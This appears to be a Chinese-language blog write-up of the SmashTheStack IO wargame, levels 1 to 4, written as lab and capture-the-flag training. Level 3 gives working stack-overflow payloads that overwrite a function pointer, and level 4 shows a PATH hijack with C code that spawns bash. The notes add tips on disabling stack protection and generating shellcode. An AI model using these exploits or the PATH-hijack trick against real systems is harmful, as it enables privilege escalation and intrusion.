---
layout: post
title:  "IO Smashthestack level1"
date:   2014-05-18 22:30:01
categories: writeup
---

#SmashTheStack Io Writeup
##level01
先看README.cn<br>
打开/levels/<br>
直接gdb level01<br>
disassemble main<br>
![level01_smash_the_stack](/blog/public/img/140518_level01.png)

将0x10f转换为十进制是271

./level01
输入271即可

##level02
在不能除0的情况下构造sig_FPE
<br>小trick<br>
abx(2**31)/-1 即可
<br>__done__


##level03
stackoverflow
<br>
input的数据没做检查，就直接覆盖了堆栈。这里需要不少的基础知识。首先是函数调用的时候的堆栈情况如下：
<br>
![level03_smash_the_stack](/blog/public/img/140519_level03.png)
<br>
由上图可以看出如果我们覆盖buffer，那么很有可能覆盖到函数指针地址。看函数源码可以得到如果我们将bad的地址换成good的函数指针地址，那么我们就成功了。

显然需要用gdb去调试,r AAAAA，disassemble main，disassemble bad.加断点在call bad之前（0x0804856d）,ebp之前的100个字节打出来x/100x 0x0804851d

找到41414141和bad的地址的差值（76）也就是说我们需要填充76位才能覆盖到bad的返回地址

这里有很多方法：

	./level03 `echo AAA...76个...AA\x74\x84\x04\x08`
	or
	./level03 $(python -c 'print "A"*76+"\x74\x84\x04\x08"')
	or
	(gdb)r $(python -c 'print "A"*76+"\x74\x84\x04\x08"')
	
ok
##level04
改path（export）

建/tmp/下的一个目录，编译一个新的whoami文件

系统找path的时候，由于我们把这个路径放在path最前面，所以系统会直接使用这个文件。

	//for example
	#include <unistd.h>

	int main(int argc, char const *argv[])
	{
		execl("/bin/bash","bash",(char*)0);
		return 0;
	}
	
	
上面的例子执行whoami的时候可以直接实现bash的执行。
###note
1. 如果想测试shellcode遇到栈不可执行的时候，会出现段错误，可以安装execstack小程序，直接-s参数对可执行文件进行处理，即可跳过这一限制
2. shellcode生成可以使用metasploit或者pwntools自己写
3. 注意64位和32位和cpu架构的区别